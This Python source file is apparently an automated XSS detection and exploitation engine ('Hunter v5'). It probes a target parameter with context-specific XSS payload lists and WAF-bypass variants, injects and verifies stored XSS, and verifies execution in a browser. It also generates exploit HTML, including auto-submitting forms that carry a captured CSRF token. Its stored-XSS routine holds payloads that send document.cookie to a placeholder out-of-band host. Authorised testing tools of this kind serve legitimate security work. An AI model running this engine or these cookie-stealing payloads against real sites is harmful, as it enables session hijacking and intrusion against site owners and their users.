"""
Hunter v5 — Auto XSS Engine (Enhanced)

Automates XSS detection and exploitation:
1. Context detection (HTML/Attribute/JS/URL)
2. Payload selection based on context
3. WAF bypass
4. DOM analysis for DOM-based XSS
5. Stored XSS detection (POST inject → GET verify)
6. Encoding analysis and bypass
"""

import asyncio
import hashlib
import inspect
import json
import re
import time
from typing import Mapping, Optional
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

try:
    from tools.probe import _get_session
except (ImportError, ModuleNotFoundError):
    import requests
    def _get_session():
        s = requests.Session()
        s.verify = False
        s.headers.update({'User-Agent': 'Mozilla/5.0'})
        return s


def _get_browser_controller():
    return None


def _run_browser_awaitable(value):
    if not inspect.isawaitable(value):
        return value
    try:
        asyncio.get_running_loop()
    except RuntimeError:
        return asyncio.run(value)

    from concurrent.futures import ThreadPoolExecutor

    with ThreadPoolExecutor(max_workers=1) as executor:
        return executor.submit(asyncio.run, value).result(timeout=30)


def _structured_mapping(value, depth: int = 0) -> dict:
    if depth > 8:
        return {}
    if isinstance(value, Mapping):
        direct_keys = {
            "page_loaded", "alert_triggered", "payload_rendered",
            "dialogs", "html", "url",
        }
        if direct_keys.intersection(value):
            return dict(value)
        for key in ("structuredContent", "data", "result", "value"):
            nested = _structured_mapping(value.get(key), depth + 1)
            if nested:
                return nested
        content = value.get("content")
        if isinstance(content, list):
            for item in content:
                nested = _structured_mapping(item, depth + 1)
                if nested:
                    return nested
        text = value.get("text")
        if isinstance(text, str):
            try:
                return _structured_mapping(json.loads(text), depth + 1)
            except (json.JSONDecodeError, TypeError):
                return {}
    if isinstance(value, list):
        for item in value:
            nested = _structured_mapping(item, depth + 1)
            if nested:
                return nested
    return {}


def _result_path(value, depth: int = 0) -> str:
    if depth > 8:
        return ""
    if isinstance(value, Mapping):
        for key in ("path", "file", "filename", "screenshot"):
            item = value.get(key)
            if isinstance(item, str) and item:
                return item
        for item in value.values():
            path = _result_path(item, depth + 1)
            if path:
                return path
    elif isinstance(value, list):
        for item in value:
            path = _result_path(item, depth + 1)
            if path:
                return path
    return ""


class AutoXSS:
    """Automated XSS detection and exploitation engine."""

    def __init__(self, base_url: str, param: str = "q",
                 method: str = "GET", session=None, headers: dict = None,
                 csrf_url: str = "", browser_controller=None):
        self.base_url = base_url
        self.param = param
        self.method = method.upper()
        self.session = session or _get_session()
        self.extra_headers = headers or {}
        self.csrf_url = csrf_url  # URL to GET for CSRF token extraction
        self.csrf_token = ""
        self.context = None
        self.payloads_tested = []
        self.vulnerable = False
        self.working_payload = None
        self.xss_type = None  # reflected, dom, stored
        self.baseline_response = None
        self.evidence = None
        self.browser_controller = browser_controller

    def _payload_url(self, payload: str = None, target_url: str = None) -> str:
        parts = urlsplit(target_url or self.base_url)
        query = [
            (key, value)
            for key, value in parse_qsl(parts.query, keep_blank_values=True)
            if key != self.param
        ]
        if payload is not None:
            query.append((self.param, payload))
        return urlunsplit(
            (parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment)
        )

    def _request_record(self, payload: str) -> dict:
        if self.method == "GET":
            return {
                "method": "GET",
                "url": self._payload_url(payload),
                "headers": dict(getattr(self, "extra_headers", {})),
                "body": "",
            }
        return {"method": self.method, "url": self.base_url, "headers": dict(getattr(self, "extra_headers", {})), "body": {self.param: payload}}

    def _build_evidence(self, payload: str, response: dict, reproduction_count: int) -> dict:
        baseline = self.baseline_response or {}
        metadata = {
            "response_time": response.get("time", 0),
            "baseline_response_time": baseline.get("time", 0),
        }
        return {
            "request": self._request_record(payload),
            "response": {"status_code": response.get("status", 0), "headers": response.get("headers", {}), "body": response.get("body", "")},
            "baseline_response": {"status_code": baseline.get("status", 0), "headers": baseline.get("headers", {}), "body": baseline.get("body", "")},
            "payload": payload,
            "reproduction_count": reproduction_count,
            "metadata": metadata,
        }

    def _ensure_baseline(self) -> dict:
        if self.baseline_response is None:
            self.baseline_response = self._test_payload("HUNTER_XSS_BASELINE_7392")
        return self.baseline_response

    def _confirm_evidence(self, payload: str, first_response: dict) -> dict:
        from core.evidence.verdict_engine import Verdict, VerdictEngine, VulnType

        responses = [first_response]
        responses.extend(self._test_payload(payload) for _ in range(2))
        confirmed = 0
        for response in responses:
            item = self._build_evidence(payload, response, 1)
            if VerdictEngine().assess(VulnType.XSS, item).verdict in {Verdict.LIKELY, Verdict.VERIFIED}:
                confirmed += 1
        evidence = self._build_evidence(payload, first_response, confirmed)
        self.evidence = evidence
        return evidence

    def _test_payload(self, payload: str, url: str = None, method: str = None,
                      headers: dict = None) -> dict:
        """Send payload and analyze response."""
        try:
            target_url = url or self.base_url
            m = method or self.method
            h = {**self.extra_headers, **(headers or {})}

            if m == "GET":
                full_url = self._payload_url(payload, target_url)
                resp = self.session.get(full_url, headers=h, timeout=10, allow_redirects=False)
            else:
                resp = self.session.post(target_url, data={self.param: payload},
                                         headers=h, timeout=10, allow_redirects=False)

            reflected = payload in resp.text
            encoded = self._check_encoding(payload, resp.text)

            return {
                "status": resp.status_code,
                "body": resp.text,
                "length": len(resp.text),
                "reflected": reflected,
                "encoded": encoded,
                "payload": payload,
            }
        except Exception as e:
            return {"status": 0, "error": str(e), "reflected": False}

    def _check_encoding(self, payload: str, body: str) -> dict:
        """Check how the payload was encoded in the response."""
        encodings = {}

        if "<" in payload:
            if "&lt;" in body and "<" not in body.split(payload)[0][-50:]:
                encodings["html_entities"] = True
            if payload in body:
                encodings["none"] = True

        if '"' in payload:
            if "&quot;" in body:
                encodings["quotes_encoded"] = True

        if "\\x3c" in body or "\\u003c" in body:
            encodings["js_encoding"] = True

        return encodings

    def _browser_payload_url(self, payload: str) -> str:
        return self._payload_url(payload)

    def _browser_baseline_url(self) -> str:
        return self._payload_url("HUNTER_XSS_BASELINE_7392")

    @staticmethod
    def _expected_alert_message(payload: str) -> str:
        match = re.search(
            r"alert\s*\(\s*(.*?)\s*\)",
            payload,
            re.IGNORECASE | re.DOTALL,
        )
        if not match:
            return ""
        argument = match.group(1).strip()
        if len(argument) >= 2 and argument[0] == argument[-1] and argument[0] in {"'", '"'}:
            return argument[1:-1]
        if re.fullmatch(r"[-+]?(?:\d+(?:\.\d*)?|\.\d+)", argument):
            return argument.lstrip("+")
        if argument in {"true", "false", "null", "undefined"}:
            return argument
        return ""

    @staticmethod
    def _text_match_verdict(response: dict) -> str:
        executable_reflection = (
            response.get("reflected")
            and not response.get("encoded", {}).get("html_entities")
        )
        return "VERIFIED" if executable_reflection else "REFUTED"

    def _browser_plan(
        self, payload: str, target_url: str, baseline_url: str
    ) -> dict:
        expected_alert_message = self._expected_alert_message(payload)
        code = (
            "async (page) => {\n"
            f"  const baselineUrl = {json.dumps(baseline_url)};\n"
            f"  const targetUrl = {json.dumps(target_url)};\n"
            f"  const payload = {json.dumps(payload)};\n"
            f"  const expectedAlertMessage = {json.dumps(expected_alert_message)};\n"
            "  const collect = async url => {\n"
            "    const dialogs = [];\n"
            "    const onDialog = async dialog => {\n"
            "      dialogs.push({type: dialog.type(), message: dialog.message()});\n"
            "      await dialog.accept().catch(() => {});\n"
            "    };\n"
            "    page.on('dialog', onDialog);\n"
            "    let pageLoaded = false;\n"
            "    let error = '';\n"
            "    try {\n"
            "      await page.goto(url, {waitUntil: 'domcontentloaded', timeout: 15000});\n"
            "      pageLoaded = true;\n"
            "      await page.waitForTimeout(300);\n"
            "    } catch (exc) { error = String(exc); }\n"
            "    let html = '';\n"
            "    try { html = await page.content(); } catch (exc) { if (!error) error = String(exc); }\n"
            "    page.off('dialog', onDialog);\n"
            "    return {page_loaded: pageLoaded, dialogs, html, url: page.url(), error};\n"
            "  };\n"
            "  const baseline = await collect(baselineUrl);\n"
            "  const injected = await collect(targetUrl);\n"
            "  const relevantAlerts = dialogs => dialogs.filter(item =>\n"
            "    item.type === 'alert' && (!expectedAlertMessage || item.message === expectedAlertMessage)\n"
            "  ).length;\n"
            "  const baselineAlerts = relevantAlerts(baseline.dialogs);\n"
            "  const injectedAlerts = relevantAlerts(injected.dialogs);\n"
            "  let payloadRendered = injected.html.includes(payload);\n"
            "  if (!payloadRendered && payload.trim().startsWith('<')) {\n"
            "    try {\n"
            "      const template = document.createElement('template');\n"
            "      template.innerHTML = payload;\n"
            "      const element = template.content.firstElementChild;\n"
            "      if (element) {\n"
            "        const candidates = Array.from(document.querySelectorAll(element.tagName));\n"
            "        const expectedText = (element.textContent || '').trim();\n"
            "        payloadRendered = candidates.some(candidate => {\n"
            "          const attributesMatch = Array.from(element.attributes).every(attribute =>\n"
            "            candidate.getAttribute(attribute.name) === attribute.value\n"
            "          );\n"
            "          const textMatches = !expectedText || (candidate.textContent || '').trim() === expectedText;\n"
            "          return attributesMatch && textMatches;\n"
            "        });\n"
            "      }\n"
            "    } catch (exc) {}\n"
            "  }\n"
            "  return {\n"
            "    page_loaded: injected.page_loaded,\n"
            "    alert_triggered: injectedAlerts > baselineAlerts,\n"
            "    payload_rendered: payloadRendered,\n"
            "    dialogs: injected.dialogs, baseline_dialogs: baseline.dialogs,\n"
            "    html: injected.html, url: injected.url, error: injected.error\n"
            "  };\n"
            "}"
        )
        return {
            "backend": "playwright-mcp",
            "mode": "external-mcp-handoff",
            "status": "proposed",
            "execution": "deferred",
            "requires_confirmation": False,
            "operation": "verify_xss",
            "target_url": target_url,
            "baseline_url": baseline_url,
            "calls": [
                {"tool": "browser_run_code", "arguments": {"code": code}}
            ],
            "on_failure": [],
        }

    def _capture_browser_screenshot(self, controller, payload: str) -> str:
        digest = hashlib.sha256(
            f"{self.base_url}|{self.param}|{payload}".encode("utf-8")
        ).hexdigest()[:12]
        filename = f"hunter-xss-likely-{digest}.png"
        plan = {
            "backend": "playwright-mcp",
            "mode": "external-mcp-handoff",
            "status": "proposed",
            "execution": "deferred",
            "requires_confirmation": False,
            "operation": "capture_xss_evidence",
            "calls": [
                {
                    "tool": "browser_take_screenshot",
                    "arguments": {"filename": filename},
                },
                {"tool": "browser_snapshot", "arguments": {}},
            ],
            "on_failure": [],
        }
        result = _run_browser_awaitable(
            controller.execute_plan(plan, execute=True)
        )
        completed = (
            isinstance(result, Mapping)
            and result.get("status") == "ok"
            and result.get("execution") == "completed"
        )
        if not completed:
            error = (
                result.get("error", "screenshot capture unavailable")
                if isinstance(result, Mapping)
                else "screenshot capture unavailable"
            )
            raise RuntimeError(str(error))
        return _result_path(result) or filename

    def _verify_payload_with_browser(self, payload: str, response: dict) -> dict:
        fallback = self._text_match_verdict(response)
        controller = self.browser_controller or _get_browser_controller()
        if controller is None or getattr(controller, "execution_adapter", None) is None:
            return {
                "verdict": fallback,
                "browser_unavailable": True,
                "fallback": "text_match",
            }

        if self.method != "GET":
            return {
                "verdict": fallback,
                "browser_unavailable": True,
                "fallback": "text_match",
                "error": "browser verification currently supports reflected GET and DOM URL sources",
            }

        target_url = self._browser_payload_url(payload)
        baseline_url = self._browser_baseline_url()
        try:
            execution = _run_browser_awaitable(
                controller.execute_plan(
                    self._browser_plan(payload, target_url, baseline_url),
                    execute=True,
                )
            )
        except Exception as exc:
            return {
                "verdict": fallback,
                "browser_unavailable": True,
                "fallback": "text_match",
                "error": str(exc),
                "url": target_url,
            }

        completed = (
            isinstance(execution, Mapping)
            and execution.get("status") == "ok"
            and execution.get("execution") == "completed"
        )
        if not completed:
            error = (
                execution.get("error", "browser execution unavailable")
                if isinstance(execution, Mapping)
                else "browser execution unavailable"
            )
            return {
                "verdict": fallback,
                "browser_unavailable": True,
                "fallback": "text_match",
                "error": str(error),
                "url": target_url,
            }

        observation = _structured_mapping(execution.get("execution_results", []))
        page_loaded = bool(observation.get("page_loaded"))
        if not page_loaded:
            return {
                "verdict": fallback,
                "browser_unavailable": True,
                "fallback": "text_match",
                "error": str(observation.get("error") or "browser page did not load"),
                "url": str(observation.get("url") or target_url),
            }

        alert_triggered = bool(observation.get("alert_triggered"))
        payload_rendered = bool(observation.get("payload_rendered"))
        verdict = (
            "VERIFIED"
            if alert_triggered
            else "LIKELY"
            if payload_rendered
            else "REFUTED"
        )
        result = {
            "verdict": verdict,
            "browser_unavailable": False,
            "page_loaded": True,
            "alert_triggered": alert_triggered,
            "payload_rendered": payload_rendered,
            "dialogs": observation.get("dialogs", []),
            "html": str(observation.get("html") or ""),
            "url": str(observation.get("url") or target_url),
        }
        if verdict == "LIKELY":
            try:
                result["screenshot"] = self._capture_browser_screenshot(
                    controller, payload
                )
            except Exception as exc:
                result["verdict"] = "INCONCLUSIVE"
                result["screenshot_error"] = str(exc)
        return result

    def _browser_evidence(
        self, payload: str, response: dict, verification: dict
    ) -> dict:
        reproduction_count = {
            "VERIFIED": 3,
            "LIKELY": 1,
            "REFUTED": 0,
        }.get(verification.get("verdict"), 0)
        evidence_response = dict(response)
        if not verification.get("browser_unavailable"):
            evidence_response["body"] = verification.get("html", "")
        evidence = self._build_evidence(
            payload, evidence_response, reproduction_count
        )
        evidence["metadata"]["browser_verification"] = {
            key: value
            for key, value in verification.items()
            if key != "html"
        }
        self.evidence = evidence
        return evidence

    def _extract_csrf(self):
        """Extract CSRF token from form page."""
        try:
            resp = self.session.get(self.csrf_url, timeout=10)
            match = re.search(r'name="csrf"[^>]*value="([^"]+)"', resp.text)
            if match:
                self.csrf_token = match.group(1)
        except Exception:
            pass

    def generate_exploit_html(self, payload: str, xss_type: str = "reflected") -> str:
        """Generate exploit HTML for delivering XSS payload.

        Args:
            payload: The XSS payload to deliver
            xss_type: 'reflected', 'stored', 'dom_hashchange'
        """
        if xss_type == "dom_hashchange":
            # DOM XSS via jQuery hashchange: iframe + delayed hash change
            return (
                f'<iframe id="f" src="{self.base_url}"></iframe>'
                f'<script>setTimeout(function(){{'
                f'document.getElementById("f").src="{self.base_url}#{payload}";'
                f'}},3000);</script>'
            )
        elif xss_type == "stored":
            # Stored XSS: auto-submit form with payload
            return (
                f'<form id="f" action="{self.base_url}" method="POST">'
                f'<input type="hidden" name="csrf" value="{self.csrf_token}">'
                f'<input type="hidden" name="{self.param}" value="{payload}">'
                f'</form>'
                f'<script>document.getElementById("f").submit();</script>'
            )
        else:
            # Reflected XSS: direct URL with payload
            from urllib.parse import quote
            return f'<script>location="{self.base_url}?{self.param}={quote(payload)}";</script>'

    def detect_context(self) -> str:
        """Detect where user input appears in the response."""
        marker = "HUNTERXSS12345"
        result = self._test_payload(marker)
        body = result.get("body", "")

        idx = body.find(marker)
        if idx == -1:
            self.context = "not_reflected"
            return "not_reflected"

        before = body[max(0, idx-100):idx]
        after = body[idx+len(marker):idx+len(marker)+100]

        # Attribute context
        if re.search(r'=\s*["\']?$', before) or re.search(r'^["\']', after):
            self.context = "attribute"
            return "attribute"

        # JavaScript context
        if "var " in before or "= '" in before or "= \"" in before:
            self.context = "javascript"
            return "javascript"

        # HTML tag context
        if "<" in before and ">" not in before[-50:]:
            self.context = "html_tag"
            return "html_tag"

        # URL context (href, src)
        if "href=" in before or "src=" in before:
            self.context = "href"
            return "href"

        # jQuery selector context
        if "$(" in before or "jQuery(" in before:
            self.context = "jquery_selector"
            return "jquery_selector"

        # Default: HTML context
        self.context = "html"
        return "html"

    def detect_dom_xss(self, js_url: str = "") -> dict:
        """Detect DOM-based XSS by analyzing JavaScript sources."""
        results = {"dom_sources": [], "dom_sinks": [], "vulnerable": False}

        # DOM XSS sources (user-controllable)
        sources = [
            "document.URL", "document.documentURI", "document.referrer",
            "location.search", "location.hash", "location.href",
            "window.location", "document.cookie", "window.name",
            "postMessage", "localStorage", "sessionStorage",
        ]

        # DOM XSS sinks (dangerous functions)
        sinks = [
            ("document.write", "high"),
            ("innerHTML", "high"),
            ("outerHTML", "high"),
            ("eval(", "critical"),
            ("setTimeout(", "high"),
            ("setInterval(", "high"),
            ("Function(", "critical"),
            ("insertAdjacentHTML", "high"),
            ("$.html(", "high"),
            ("$.append(", "medium"),
            ("$.prepend(", "medium"),
            ("$.after(", "medium"),
            ("$.before(", "medium"),
            ("$.replaceWith(", "medium"),
            ("document.writeln", "high"),
            ("location.href =", "high"),
            ("location.assign(", "high"),
            ("location.replace(", "high"),
            ("window.open(", "medium"),
        ]

        # Fetch and analyze JS files
        js_content = ""
        try:
            if js_url:
                resp = self.session.get(js_url, timeout=10)
                js_content = resp.text
            else:
                # Try to get page and extract inline scripts
                resp = self.session.get(self.base_url, timeout=10)
                # Extract inline scripts
                script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
                scripts = script_pattern.findall(resp.text)
                js_content = "\n".join(scripts)

                # Extract external script URLs and fetch them
                src_pattern = re.compile(r'<script[^>]*src=["\']([^"\']+)["\']', re.IGNORECASE)
                src_urls = src_pattern.findall(resp.text)
                for src in src_urls[:5]:  # Limit to 5 external scripts
                    if src.startswith("//"):
                        src = "https:" + src
                    elif src.startswith("/"):
                        from urllib.parse import urlparse
                        parsed = urlparse(self.base_url)
                        src = f"{parsed.scheme}://{parsed.netloc}{src}"
                    try:
                        js_resp = self.session.get(src, timeout=5)
                        js_content += "\n" + js_resp.text
                    except Exception:
                        continue
        except Exception:
            return {"error": "Failed to fetch JavaScript", "vulnerable": False}

        # Search for sources
        for source in sources:
            if source in js_content:
                results["dom_sources"].append(source)

        # Search for sinks
        for sink, severity in sinks:
            if sink in js_content:
                results["dom_sinks"].append({"sink": sink, "severity": severity})

        # Check for source-to-sink flows (simple heuristic)
        if results["dom_sources"] and results["dom_sinks"]:
            high_sinks = [s for s in results["dom_sinks"] if s["severity"] in ("critical", "high")]
            if high_sinks:
                results["vulnerable"] = True
                results["severity"] = "high"
                results["detail"] = f"Found {len(results['dom_sources'])} sources and {len(high_sinks)} high-severity sinks"

                # Generate test payloads
                test_payloads = []
                for source in results["dom_sources"]:
                    if "hash" in source.lower():
                        test_payloads.append(f"javascript:{self.base_url}#<img src=x onerror=alert(1)>")
                    elif "search" in source.lower() or "URL" in source:
                        test_payloads.append(f"<img src=x onerror=alert(1)>")

                results["test_payloads"] = test_payloads

        return results

    def test_stored_xss(self, inject_url: str, verify_url: str = "",
                        inject_method: str = "POST", verify_method: str = "GET",
                        extra_params: dict = None) -> dict:
        """Test for stored XSS by injecting and verifying."""
        if not verify_url:
            verify_url = self.base_url

        marker = f"<img src=x onerror=alert('HUNTER{int(time.time())}')>"
        results = {"injected": False, "reflected": False, "vulnerable": False}

        # Inject payload
        try:
            h = {**self.extra_headers, "Content-Type": "application/x-www-form-urlencoded"}
            data = {self.param: marker}
            if extra_params:
                data.update(extra_params)

            if inject_method.upper() == "POST":
                inject_resp = self.session.post(inject_url, data=data, headers=h, timeout=10)
            else:
                inject_resp = self.session.get(inject_url, params=data, headers=h, timeout=10)

            results["inject_status"] = inject_resp.status_code
            results["injected"] = inject_resp.status_code in (200, 201, 301, 302)
        except Exception as e:
            results["inject_error"] = str(e)
            return results

        # Verify on different page
        if results["injected"]:
            time.sleep(1)  # Wait for storage
            try:
                verify_resp = self.session.get(verify_url, headers=self.extra_headers, timeout=10)
                if marker in verify_resp.text:
                    results["reflected"] = True
                    results["vulnerable"] = True
                    self.vulnerable = True
                    self.xss_type = "stored"
                    self.working_payload = marker
                    results["verify_status"] = verify_resp.status_code

                    # Test with more dangerous payloads
                    exploit_payloads = [
                        "<script>document.location='http://HUNTER_OOB/?c='+document.cookie</script>",
                        "<img src=x onerror=fetch('http://HUNTER_OOB/?c='+document.cookie)>",
                    ]
                    results["exploit_payloads"] = exploit_payloads
            except Exception as e:
                results["verify_error"] = str(e)

        return results

    def get_payloads_for_context(self, context: str, waf_detected: bool = False) -> list:
        """Get XSS payloads for the detected context."""
        payloads = {
            "html": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<body onload=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<math><mtext></mtext><mglyph><svg><mtext><textarea><path id='</textarea><img onerror=alert(1) src=1>'>",
                "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
            ],
            "attribute": [
                "\" autofocus onfocus=alert(1) \"",
                "\" onmouseover=alert(1) \"",
                "' onfocus=alert(1) autofocus '",
                "\" onfocus=alert(1) autofocus \"",
                "\" onmouseover=alert(1) x=\"",
                "'-alert(1)-'",
                "\";alert(1);//",
                "\" onclick=alert(1) x=\"",
                "' onfocus=alert(1) autofocus '",
                "\" accesskey=x onclick=alert(1) \"",
            ],
            "javascript": [
                "';alert(1);//",
                "\";alert(1);//",
                "</script><script>alert(1)</script>",
                "-alert(1)-",
                "{{constructor.constructor('alert(1)')()}}",
                "'-alert(1)-'",
                "\\'-alert(1)-//",
                "\\x3c/script\\x3e\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            ],
            "html_tag": [
                "><script>alert(1)</script>",
                "><img src=x onerror=alert(1)>",
                " onmouseover=alert(1) ",
                " autofocus onfocus=alert(1) ",
                " onload=alert(1) ",
            ],
            "href": [
                "javascript:alert(1)",
                "javascript:alert(document.cookie)",
                "data:text/html,<script>alert(1)</script>",
                "javascript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            ],
            "jquery_selector": [
                "#<img src=x onerror=alert(1)>",
                "#<svg onload=alert(1)>",
                "#<body onload=alert(1)>",
            ],
            "dom_innerhtml": [
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<details open ontoggle=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "<body onload=alert(1)>",
            ],
            "dom_documentwrite": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
        }

        result = payloads.get(context, payloads["html"])

        if waf_detected:
            result.extend([
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(1)>",
                "${alert(1)}",
                "javascript:alert(1)",
                "<details open ontoggle=alert(1)>",
                "<marquee onstart=alert(1)>",
                "<video src=x onerror=alert(1)>",
                "<audio src=x onerror=alert(1)>",
                "'-alert(1)-'",
                "<img/src=x onerror=alert(1)>",
                "<svg onload=alert&#40;1&#41;>",
                "<svg onload = alert(1)>",
            ])

        return result

    def detect_waf(self) -> bool:
        """Quick WAF detection for XSS."""
        result = self._test_payload("<script>alert(1)</script>")
        body = result.get("body", "").lower()

        waf_indicators = ["blocked", "forbidden", "waf", "firewall", "security",
                         "not acceptable", "request rejected"]
        return any(ind in body for ind in waf_indicators) or result.get("status") in (403, 406, 429)

    def run_full_scan(self, dom_check: bool = True,
                      stored_url: str = "", stored_params: dict = None,
                      verify_with_browser: bool = False) -> dict:
        """Run complete automated XSS scan."""
        start = time.time()
        results = {
            "target": self.base_url,
            "param": self.param,
            "steps": [],
        }
        self._ensure_baseline()

        context = self.detect_context()
        results["context"] = context
        results["steps"].append({"step": "context_detection", "result": context})

        if context == "not_reflected":
            results["conclusion"] = "Input not reflected in response"
            dom_result = None
            if dom_check:
                dom_result = self.detect_dom_xss()
                results["dom_xss"] = dom_result
                results["steps"].append({"step": "dom_xss", "result": dom_result})
                if dom_result.get("vulnerable"):
                    if verify_with_browser:
                        payload = "<script>alert(1)</script>"
                        probe = self._test_payload(payload)
                        verification = self._verify_payload_with_browser(payload, probe)
                        results["browser_verification"] = verification
                        results["browser_unavailable"] = verification["browser_unavailable"]
                        results["steps"].append({
                            "step": "browser_verification",
                            "result": {
                                key: value
                                for key, value in verification.items()
                                if key != "html"
                            },
                        })
                        if verification["browser_unavailable"]:
                            self.vulnerable = True
                            self.xss_type = "dom"
                            self.working_payload = payload
                            results["evidence"] = self._confirm_evidence(payload, probe)
                        else:
                            results["evidence"] = self._browser_evidence(
                                payload, probe, verification
                            )
                            self.working_payload = payload
                            self.xss_type = "dom"
                            self.vulnerable = verification["verdict"] == "VERIFIED"
                    else:
                        self.vulnerable = True
                        self.xss_type = "dom"

            if stored_url:
                stored_result = self.test_stored_xss(
                    inject_url=stored_url,
                    extra_params=stored_params,
                )
                results["stored_xss"] = stored_result
                results["steps"].append({"step": "stored_xss", "result": stored_result})

            results["vulnerable"] = self.vulnerable
            results["working_payload"] = self.working_payload
            results["xss_type"] = self.xss_type
            results["elapsed_ms"] = int((time.time() - start) * 1000)
            return results

        waf = self.detect_waf()
        results["waf_detected"] = waf
        results["steps"].append({"step": "waf_detection", "result": waf})

        payloads = self.get_payloads_for_context(context, waf)
        results["payloads_tested"] = len(payloads)
        likely_candidate = None

        for payload in payloads:
            response = self._test_payload(payload)
            self.payloads_tested.append(response)
            candidate = (
                response.get("reflected")
                and not response.get("encoded", {}).get("html_entities")
            )
            if not candidate:
                continue

            if verify_with_browser:
                verification = self._verify_payload_with_browser(payload, response)
                results["browser_verification"] = verification
                results["browser_unavailable"] = verification["browser_unavailable"]
                results["steps"].append({
                    "step": "browser_verification",
                    "result": {
                        key: value
                        for key, value in verification.items()
                        if key != "html"
                    },
                })
                if verification["browser_unavailable"]:
                    self.vulnerable = True
                    self.working_payload = payload
                    self.xss_type = "reflected"
                    results["evidence"] = self._confirm_evidence(payload, response)
                    break
                if verification["verdict"] == "VERIFIED":
                    self.vulnerable = True
                    self.working_payload = payload
                    self.xss_type = "reflected"
                    results["evidence"] = self._browser_evidence(
                        payload, response, verification
                    )
                    break
                if verification["verdict"] == "LIKELY" and likely_candidate is None:
                    likely_candidate = (payload, response, verification)
                continue

            self.vulnerable = True
            self.working_payload = payload
            self.xss_type = "reflected"
            results["steps"].append({
                "step": "payload_test",
                "result": {
                    "payload": payload,
                    "reflected": True,
                    "encoded": response.get("encoded"),
                },
            })
            break

        if likely_candidate and not self.vulnerable:
            payload, response, verification = likely_candidate
            self.working_payload = payload
            self.xss_type = "reflected"
            results["browser_verification"] = verification
            results["evidence"] = self._browser_evidence(
                payload, response, verification
            )

        if dom_check:
            dom_result = self.detect_dom_xss()
            results["dom_xss"] = dom_result
            results["steps"].append({"step": "dom_xss", "result": dom_result})
            if dom_result.get("vulnerable") and not self.vulnerable:
                if verify_with_browser:
                    payload = "<script>alert(1)</script>"
                    response = self._test_payload(payload)
                    verification = self._verify_payload_with_browser(payload, response)
                    results["browser_verification"] = verification
                    results["browser_unavailable"] = verification["browser_unavailable"]
                    results["steps"].append({
                        "step": "browser_verification",
                        "result": {
                            key: value
                            for key, value in verification.items()
                            if key != "html"
                        },
                    })
                    if verification["browser_unavailable"]:
                        self.vulnerable = True
                        self.working_payload = payload
                        self.xss_type = "dom"
                        results["evidence"] = self._confirm_evidence(payload, response)
                    elif verification["verdict"] == "VERIFIED":
                        self.vulnerable = True
                        self.working_payload = payload
                        self.xss_type = "dom"
                        results["evidence"] = self._browser_evidence(
                            payload, response, verification
                        )
                    elif verification["verdict"] == "LIKELY" and not likely_candidate:
                        self.working_payload = payload
                        self.xss_type = "dom"
                        results["evidence"] = self._browser_evidence(
                            payload, response, verification
                        )
                    elif likely_candidate:
                        reflected_payload, reflected_response, reflected_verification = likely_candidate
                        self.working_payload = reflected_payload
                        self.xss_type = "reflected"
                        results["browser_verification"] = reflected_verification
                        results["evidence"] = self._browser_evidence(
                            reflected_payload, reflected_response, reflected_verification
                        )
                elif not verify_with_browser:
                    self.vulnerable = True
                    self.xss_type = "dom"

        if stored_url:
            stored_result = self.test_stored_xss(
                inject_url=stored_url,
                extra_params=stored_params,
            )
            results["stored_xss"] = stored_result
            results["steps"].append({"step": "stored_xss", "result": stored_result})

        if not self.vulnerable:
            results["vulnerable"] = False
            if likely_candidate:
                results["conclusion"] = (
                    "Payload rendered in the browser but script execution was not observed."
                )
            else:
                results["conclusion"] = (
                    "No browser-executable reflection found. May need manual testing."
                    if verify_with_browser
                    else "No unencoded reflection found. May need manual testing."
                )
        else:
            results["vulnerable"] = True
            results["working_payload"] = self.working_payload
            results["xss_type"] = self.xss_type

        if self.working_payload and "evidence" not in results:
            first_response = self._test_payload(self.working_payload)
            results["evidence"] = self._confirm_evidence(
                self.working_payload, first_response
            )

        results["working_payload"] = self.working_payload
        results["xss_type"] = self.xss_type
        results["elapsed_ms"] = int((time.time() - start) * 1000)
        return results


def auto_xss_impl(base_url: str, param: str = "q", method: str = "GET",
                   dom_check: bool = True, stored_url: str = "",
                   stored_params: dict = None, headers: dict = None,
                   verify_with_browser: bool = False,
                   browser_controller=None) -> dict:
    """Run automated XSS scan. Entry point for MCP tool."""
    engine = AutoXSS(
        base_url,
        param,
        method,
        headers=headers,
        browser_controller=browser_controller,
    )
    return engine.run_full_scan(
        dom_check=dom_check,
        stored_url=stored_url,
        stored_params=stored_params,
        verify_with_browser=verify_with_browser,
    )
